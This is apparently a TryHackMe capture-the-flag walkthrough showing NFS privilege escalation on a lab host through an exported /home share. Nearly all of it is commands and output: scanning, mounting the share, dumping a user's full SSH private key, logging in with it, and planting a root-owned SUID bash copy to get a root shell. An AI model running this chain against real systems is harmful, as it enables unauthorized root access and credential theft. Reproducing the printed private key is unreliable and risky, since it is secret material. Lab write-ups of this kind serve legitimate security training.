# Exploiting NFS

Exploiting NFS through root_squash: SUID.

Target: 10.10.243.171

$  ping 10.10.243.171
```
PING 10.10.243.171 (10.10.243.171) 56(84) bytes of data.
64 bytes from 10.10.243.171: icmp_seq=1 ttl=63 time=332 ms
64 bytes from 10.10.243.171: icmp_seq=2 ttl=63 time=368 ms
^C
--- 10.10.243.171 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1001ms
rtt min/avg/max/mdev = 331.559/350.011/368.463/18.452 ms
```
$  sudo nmap -O 10.10.243.171
```
[sudo] password for isla:
Starting Nmap 7.95 ( https://nmap.org ) at 2024-06-20 18:50 WIB
Nmap scan report for 10.10.243.171
Host is up (0.28s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
111/tcp  open  rpcbind
2049/tcp open  nfs
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 2 hops

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.99 seconds
```
$  showmount -e 10.10.243.171
```
Export list for 10.10.243.171:
/home *
```
$  mkdir /tmp/mount-nfs
$  sudo mount -t nfs 10.10.243.171:home /tmp/mount-nfs -v
```
mount.nfs: timeout set for Thu Jun 20 18:55:03 2024
mount.nfs: trying text-based options 'vers=4.2,addr=10.10.243.171,clientaddr=10.9.2.88'
```
$  cd /tmp/mount-nfs
/tmp/mount-nfs  tree
```
.
└── cappucino
    ├── .bash_history
    ├── .bash_logout
    ├── .bashrc
    ├── .cache
    │   └── motd.legal-displayed
    ├── .gnupg
    │   └── private-keys-v1.d
    ├── .profile
    ├── .ssh
    │   ├── authorized_keys
    │   ├── id_rsa
    │   └── id_rsa.pub
    └── .sudo_as_admin_successful

6 directories, 9 files
```
/tmp/mount-nfs  cd cappucino
/tmp/mount-nfs/cappucino   bat .ssh/id_rsa
```
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: .ssh/id_rsa
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ -----BEGIN RSA PRIVATE KEY-----
   2   │ MIIEpQIBAAKCAQEA03JNcEu6K3LnfFYhiSjWMa4KxT4Q4KTh9uNxQaBBYHwnc7+1
   3   │ nFl4FICPhjz8kLHmz826wDGU/x46RJno7l1n0Y4y5VTOX/oaGpTdmmbfUwGYvOPu
   4   │ 3Fj92rPoqu/RcFBNbrnqfpfajeinkMwtcOLBOpSak13P8km6JwBzELvKw2a2GL4N
   5   │ SMzskVW6PNTKiCgwOmFJT4WOivkkgXAnuR4PXt/TSkAgpN3KDCR1a1xDhkO8+zxE
   6   │ vpDP81rn2PD40lmfeh/yG6wJ9sVlqm1g9IbozHABaTPhx1d8RDn0Cz6gVvsNtS6h
   7   │ yqBQazUtOOxreHunzRpabp3kAWf/Ao62fTR9hwIDAQABAoIBAQDRGQK9XxW+q8WB
   8   │ LofBZJHU1SCvhz4XeNZAWREB7eFY8c3t6BJHiC54T94eyKaWzGbM7syUDTQjyZej
   9   │ iXRQbCwjjfSE1wWy4df4m2g9rSeBpV2OxfTLEHIRWcJnb/r0j2TTb6UWBUNK/Fzg
  10   │ kxkIviSJsrTdsHLYTdJ5iTdAwAS2j0mjTSVfUOjeB8kSF6o+e73a2PYpsh8gzh7i
  11   │ Pj82ge1fXoA4Vkg+0Evv1ZoS3VDhJYhWfBrIr/l/JF52PPZfcELpl8ZCkAnXIL9M
  12   │ bZomittLwudvtqTmADye2LhPu59vnz8SRQYiCLj/ICxz+Zo5syPRc4tQKw91VYMe
  13   │ IWYQ+sG5AoGBAPj7v02GAhgp9v5yh/1VyAv0zRmSfbinyVeAywZELi2r93WMz2zL
  14   │ Be3Ys35tlNxvpCHZQO8X23oWeYXkOmIw4OYJcPwHN48QilV1JO1G6jW362oefH4L
  15   │ rHW/PXgW4Ur3/gMdSeiOtolT+Hz7weg+89begWkHSvSvDS6p9Jw8BE3dAoGBANln
  16   │ wEKg+YLJpzBzuTOzUle/K6vsCQl5wynMz80t2Ntu0SAmsx7itX7cPMfjjIYjVkx3
  17   │ kPA76EdZjI51fN0XKlJwUj7t//mj/VyO7iKdQkBiLfADDMmjawYk1hfFaAufTwSz
  18   │ pXEfEQBzR+iF2uHjDd8cRUkQjibcr67pAawuN3yzAoGBALz47bhcJojKiQGUUeyQ
  19   │ R9XzRhvLmIonJuS4Bt/JrbbSV24rol8zNFvSZmFlsF8iiNN7/hG57MWb+z4I+9r8
  20   │ uCVAMzXGEIAQEL5Nu+ovMaH15sJTQy+zkoCH1pKn4vSwhmU8vJS6hIZ0ahwKRKEN
  21   │ 7qo9lMDvXQ+bMQkiy1otHyMtAoGBALj6kBmhAeuITJrrO/+DamKCpFPpx16qnaXp
  22   │ QD4h7kv2pDUo+GslFqxUE9s3/476bikt6sKdFmvvA6sKyC0N0tLGAxTMSGpOX/rr
  23   │ Gi+VgpNpdhCrZ6wBQcS+fvNG4dpRuFgVyoTPnBW4AM0VZ0GfgWP+l+0tCuaCC3FV
  24   │ jDjGMiwFAoGAZeCCUXGze0dQpLsPK+phVf6mpYu9wD2EtNbj8ivGnEMMmuyTPxlW
  25   │ puGt3aJ1+8YqgfPu6QhE/VgroYLOpww8GxnFeMhMgeOuJG+OtgVVAYpgoSRgVTXS
  26   │ EGWF78kzFB6HSJBYnpr6LCFp8SRXKYeHEzR9upT30+F4RNaEJqvK6Ng=
  27   │ -----END RSA PRIVATE KEY-----
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```
/tmp/mount-nfs/cappucino  cp .ssh/id_rsa \~/Documents/
/tmp/mount-nfs/cappucino  cd \~/Documents
~/Documents $  ls
```
 Books  'Cisco!'   DeffreusTheda  'Dream Logs'   id_rsa  'Learn RE'   Logs   SMAPDA  'THEDA TO ALL'
```
~/Documents $  cd /tmp/mount-nfs
/tmp/mount-nfs  bat $(fd -tf) #: search for user name: found: cappucino
/tmp/mount-nfs  cd \~/Documents
~/Documents $  ssh -i id_rsa cappucino@10.10.243.171
```
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Jun 20 11:58:36 UTC 2024

  System load:  0.11              Processes:           103
  Usage of /:   45.2% of 9.78GB   Users logged in:     0
  Memory usage: 31%               IP address for eth0: 10.10.243.171
  Swap usage:   0%


44 packages can be updated.
0 updates are security updates.


Last login: Thu Jun  4 14:37:50 2020
```
cappucino@polonfs:\~$  echo $SHELL
```
/bin/bash
```
cappucino@polonfs:\~$  stat /bin/bash
```
  File: /bin/bash
  Size: 1113504   	Blocks: 2176       IO Block: 4096   regular file
Device: ca02h/51714d	Inode: 393562      Links: 1
Access: (0755/-rwxr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)
Access: 2024-06-20 11:48:39.988000000 +0000
Modify: 2019-06-06 22:28:15.000000000 +0000
Change: 2020-04-21 22:18:17.228000000 +0000
 Birth: -
```
cappucino@polonfs:~$  exit
```
logout
Connection to 10.10.243.171 closed.
```
~/Documents $  scp -i id_rsa cappucino@10.10.243.171:/bin/bash ./bash-nfs
```
bash                                                                                                       100% 1087KB  28.0KB/s   00:38
```
~/Documents $  stat bash-nfs
```
  File: bash-nfs
  Size: 1113504   	Blocks: 2176       IO Block: 4096   regular file
Device: 0,42	Inode: 1967270     Links: 1
Access: (0755/-rwxr-xr-x)  Uid: ( 1000/  isla)   Gid: ( 1000/  isla)
Access: 2024-06-20 19:03:23.731565869 +0700
Modify: 2024-06-20 19:04:02.549126170 +0700
Change: 2024-06-20 19:04:02.549126170 +0700
 Birth: 2024-06-20 19:03:23.731565869 +0700
```
~/Documents $  sudo chown root:root bash-nfs
```
[sudo] password for isla:
```
~/Documents $  stat bash-nfs
```
  File: bash-nfs
  Size: 1113504   	Blocks: 2176       IO Block: 4096   regular file
Device: 0,42	Inode: 1967270     Links: 1
Access: (0755/-rwxr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)
Access: 2024-06-20 19:03:23.731565869 +0700
Modify: 2024-06-20 19:04:02.549126170 +0700
Change: 2024-06-20 19:05:02.306449281 +0700
 Birth: 2024-06-20 19:03:23.731565869 +0700
```
~/Documents $  sudo chmod +s bash-nfs
~/Documents $  stat bash-nfs
```
  File: bash-nfs
  Size: 1113504   	Blocks: 2176       IO Block: 4096   regular file
Device: 0,42	Inode: 1967270     Links: 1
Access: (6755/-rwsr-sr-x)  Uid: (    0/    root)   Gid: (    0/    root)
Access: 2024-06-20 19:03:23.731565869 +0700
Modify: 2024-06-20 19:04:02.549126170 +0700
Change: 2024-06-20 19:05:16.667286612 +0700
 Birth: 2024-06-20 19:03:23.731565869 +0700
```
~/Documents $  mv bash-nfs /tmp/mount-nfs
```
mv: cannot create regular file '/tmp/mount-nfs/bash-nfs': Permission denied
```
~/Documents $  sudo mv bash-nfs /tmp/mount-nfs
~/Documents $  ls /tmp/mount-nfs -a
```
.  ..  bash-nfs  cappucino
```
~/Documents $  ssh -i id_rsa cappucino@10.10.243.171
```
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Jun 20 12:10:52 UTC 2024

  System load:  0.0               Processes:           101
  Usage of /:   45.2% of 9.78GB   Users logged in:     0
  Memory usage: 31%               IP address for eth0: 10.10.243.171
  Swap usage:   0%


44 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Thu Jun 20 12:06:27 2024 from 10.9.2.88
```
cappucino@polonfs:~$  ../bash-nfs -p
bash-nfs-4.4#  ls -a
```
.  ..  .bash_history  .bash_logout  .bashrc  .cache  .gnupg  .profile  .ssh  .sudo_as_admin_successful
```
bash-nfs-4.4#  cd /
bash-nfs-4.4#  ls -a
```
.   bin   cdrom  etc   initrd.img      lib    lost+found  mnt  proc  run   snap  swap.img  tmp	var	vmlinuz.old
..  boot  dev	home  initrd.img.old  lib64  media	 opt  root  sbin  srv	sys	  usr	vmlinuz
```
bash-nfs-4.4#  cd root/
bash-nfs-4.4#  ls -a
```
.  ..  .bash_history  .bashrc  .cache  .gnupg  .profile  root.txt  .ssh  .viminfo
```
bash-nfs-4.4#  cat root.txt
```
THM{nfs_got_pwned}
```
bash-nfs-4.4#  exit
```
exit
```
cappucino@polonfs:~$  exit
```
logout
Connection to 10.10.243.171 closed.
```
